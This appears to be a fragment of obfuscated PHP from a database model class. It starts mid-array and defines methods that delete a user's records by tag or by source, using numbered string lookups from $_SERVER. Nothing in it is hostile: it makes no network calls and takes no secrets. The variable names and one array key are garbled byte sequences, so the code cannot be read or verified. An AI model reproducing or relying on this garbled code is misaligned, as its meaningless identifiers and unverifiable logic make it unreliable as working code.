array($aã’ëæƒ¦¯[1441] => USER_ID, $aã’ëæƒ¦¯[439] => $B®‰¡ö«õˆ, $aã’ëæƒ¦¯[392] => $aã’ëæƒ¦¯[386], $aã’ëæƒ¦¯[391] => $A²»ù™¶„Ø); return $this->where($CòÀİÜ¡¥ä)->delete(); } protected function removeByTag($a»³»òãòà) { $bšùâ¤”× =& $_SERVER[…Ò×–]; if (!$a»³»òãòà) { return !1; } $b…¡Ç¥ÎàŒ = array($bšùâ¤”×[1441] => USER_ID, $bšùâ¤”×[439] => $a»³»òãòà); return $this->where($b…¡Ç¥ÎàŒ)->delete(); } protected function removeBySource($Bï©âÑÀœ†) { $CâÇÁ–ğ‘ =& $_SERVER[…Ò×–]; if (is_array($Bï©âÑÀœ†)) { $Bï©âÑÀœ† = array($CâÇÁ–ğ‘[7], $Bï©âÑÀœ†); } $eãòó¼Ï­ = array($CâÇÁ–ğ‘[1441] => USER_ID, $CâÇÁ–ğ‘[391] => $Bï©âÑÀœ†, $CâÇÁ–ğ‘[439] => array($CâÇÁ–ğ‘[934], 0)); return $this->where($eãòó¼Ï­)->delete(); } }